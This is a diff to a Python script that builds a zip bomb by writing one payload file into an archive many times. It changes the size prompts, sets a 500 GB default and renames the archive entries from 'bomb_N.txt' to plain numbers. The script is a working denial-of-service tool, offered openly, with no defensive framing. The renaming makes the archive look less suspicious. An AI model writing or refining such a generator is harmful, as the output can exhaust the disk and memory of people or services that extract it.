@@ -26,9 +26,9 @@ def get_bytes(amount_str):
     except:
         raise ValueError("Format: <number> <unit>, e.g., 1 PB or 500 GB")
 
-target_input = input("Bomb decompressed size? (e.g., '1 PB', '500 GB'): ")
-payload_input = input("Payload file size? (default 1 MB, format <number> <unit>): ") or "1 MB"
-zip_name = input("Output zip name? (default: bomb.zip): ") or "bomb.zip"
+target_input = input("Bomb decompressed size: ") or "500 GB"
+payload_input = input("Payload file size: ") or "1 MB"
+zip_name = input("Output zip name: ") or "bomb.zip"
 
 PAYLOAD_NAME = "payload.txt"
 DECOMPRESSED_TOTAL = get_bytes(target_input)
@@ -45,7 +45,7 @@ with open(PAYLOAD_NAME, "wb") as f:
 
 with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
     for i in range(REPEATS):
-        arcname = f"bomb_{i}.txt"
+        arcname = f"{i}.txt"
         zf.write(PAYLOAD_NAME, arcname)
         progress_bar(i + 1, REPEATS)
 
